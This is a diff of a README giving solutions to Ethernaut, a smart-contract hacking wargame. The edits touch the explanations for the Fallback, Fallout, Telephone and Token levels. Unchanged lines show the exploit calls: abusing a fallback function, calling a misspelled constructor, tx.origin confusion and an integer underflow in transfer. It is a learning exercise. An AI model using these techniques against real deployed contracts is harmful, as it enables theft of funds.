@@ -1,7 +1,7 @@
 # Ethernaut solution
 
 ## 1. Fallback
-Abusing erroneous logic between contract functions and fallback function
+Abusing erroneous logic between contract functions and fallback function.
 ```
 await contract.contribute({value: 1234});
 await contract.sendTransaction({value: 1234});
@@ -9,7 +9,7 @@ await contract.withdraw();
 ```
 
 ## 2. Fallout
-Constructor is spelled wrongly; becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0.
+Constructor is spelled wrongly so it becomes a regular function. In any case, you can't use the contract name as a constructor in solidity 0.5.0 and above.
 ```
 await contract.Fal1out({value: 1234});
 await contract.sendAllocation(await contract.owner());
@@ -49,7 +49,7 @@ contract AttackCoinFlip {
 ```
 
 ## 4. Telephone
-When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from.
+When you call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that you initiated the function from which is tx.origin.
 ```
 pragma solidity ^0.6.0;
 contract AttackTelephone {
@@ -68,7 +68,7 @@ contract AttackTelephone {
 ```
 
 ## 5. Token
-Be careful of integer over/underflow. Always use safemath libraries. Basically I understood that no matter what parameter I entered as _value, it will always return a number that is > 0 because it's a uint therefore the require statement is as good as useless. 
+No integer over/underflow protection. Always use [safemath](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol) libraries. As long as you pass a value > 20, the condition in the first require statement will underflow and it will always pass. 
 ```
 await contract.transfer(instance, 25)
 ```
